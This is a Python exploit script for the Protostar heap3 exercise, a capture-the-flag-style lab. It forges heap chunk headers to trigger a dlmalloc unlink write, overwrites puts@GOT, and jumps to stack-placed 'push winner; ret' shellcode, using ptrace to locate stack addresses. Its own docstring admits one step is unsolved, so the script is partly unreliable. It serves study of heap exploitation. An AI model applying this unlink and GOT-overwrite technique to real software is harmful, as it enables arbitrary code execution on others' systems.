#!/usr/bin/env python3
"""
ex06 -- Protostar heap3.

main(): three malloc(0x20) chunks A,B,C; three unbounded strcpy() from
argv[1..3]; three free()s (order C,B,A); then puts("dynamite failed?").
A winner() function at 0x08048864 prints the success message.

Primitive: overflow B (argv[2]) into C's chunk header. free(C) sees
PREV_INUSE clear and backward-consolidates -> unlink(P) where
P = C_chunk - prev_size. With prev_size = -8, P = C.data, so unlink reads
its fd/bk from the start of argv[3]:
    *(fd + 12) = bk      -> puts@GOT gets overwritten with bk
    *(bk + 8)  = fd
Set fd = puts@GOT - 12 and bk = a trampoline, so the final puts() call
jumps to the trampoline -> winner().

Two things that must be respected (the "skip it and continue" gotchas):
  1. free() calls malloc_consolidate() when the consolidated size exceeds
     0xffff (cmp at 0x80499d3), which then walks corrupted state. Using
     size 0xfffffffc makes nextchunk wrap *backwards* to controlled heap
     instead of forward into unmapped memory. NOTE: this survives to puts()
     only when bk points into the HEAP; with a stack bk (as used below)
     malloc_consolidate still loops on the corrupted list -- this is the
     unsolved step. See solutions/ex06.md.
  2. The forward-consolidation unlink is skipped by making an "in use" bit
     odd: the byte that lands at 0x804c048 (argv2[24]).
  3. The heap is rw- (NOT executable) even though checksec says "NX
     disabled" -- only the stack is rwx. So the trampoline must run from the
     STACK: bk points at argv3's on-stack copy, which holds `push winner; ret`.
     argv3 is kept short (<=28 bytes) so its heap copy stays inside chunk C
     and does not corrupt the top chunk.

argv[3]'s stack address is measured at runtime by a ptrace'd recon child
(personality(ADDR_NO_RANDOMIZE) + empty env), so no address is hardcoded.
"""
import ctypes, os, struct, sys

p = lambda x: struct.pack("<I", x & 0xffffffff)
libc = ctypes.CDLL("libc.so.6", use_errno=True)
PTRACE_TRACEME, PTRACE_KILL, PTRACE_GETREGS = 0, 8, 12
ADDR_NO_RANDOMIZE = 0x0040000
TARGET = b"./ex06/bin"

WINNER   = 0x08048864
PUTS_GOT = 0x0804b128
FD       = PUTS_GOT - 12          # unlink writes bk to *(FD+12) == puts@GOT


def build(bk):
    a1 = b"AAAA"
    b = bytearray(b"B" * 32)
    b[24] = 0x43                                  # odd -> skip forward-consolidation unlink
    a2 = bytes(b) + p(0xfffffff8) + p(0xfffffffc) # forge C.prev_size, C.size
    a3 = bytearray(b"\x90" * 28)                  # short: heap copy stays inside chunk C
    a3[8:12]  = p(FD)                             # P->fd
    a3[12:16] = p(bk)                             # P->bk  (== puts jump target)
    a3[16:22] = b"\x68" + p(WINNER) + b"\xc3"     # push winner ; ret  (runs from stack copy)
    return a1, a2, bytes(a3)


def spawn(argv):
    pid = os.fork()
    if pid == 0:
        libc.personality(ADDR_NO_RANDOMIZE)
        libc.ptrace(PTRACE_TRACEME, 0, 0, 0)
        os.execve(TARGET, [TARGET] + list(argv), {})
        os._exit(127)
    os.waitpid(pid, 0)                            # child stops at execve trap
    return pid


def esp_of(pid):
    regs = (ctypes.c_ulonglong * 27)()
    libc.ptrace(PTRACE_GETREGS, pid, 0, ctypes.byref(regs))
    return regs[19] & 0xffffffff                  # rsp slot -> 32-bit esp


def measure(argv):
    pid = spawn(argv)
    esp = esp_of(pid)
    with open(f"/proc/{pid}/mem", "rb") as f:
        f.seek(esp + 16)                          # [esp+16] == argv[3]
        argv3 = struct.unpack("<I", f.read(4))[0]
    libc.ptrace(PTRACE_KILL, pid, 0, 0)
    os.waitpid(pid, 0)
    return argv3


def main():
    argv3_stack = measure(build(0x11111111))      # placeholder: correct lengths
    bk = argv3_stack + 16                          # jump to the `push winner; ret` in the stack copy
    print(f"[*] argv3 stack copy @ {hex(argv3_stack)}  bk -> {hex(bk)}", file=sys.stderr)
    a1, a2, a3 = build(bk)
    for a in (a1, a2, a3):
        assert b"\x00" not in a, a.hex()
    libc.personality(ADDR_NO_RANDOMIZE)
    os.execve(TARGET, [TARGET, a1, a2, a3], {})


if __name__ == "__main__":
    main()
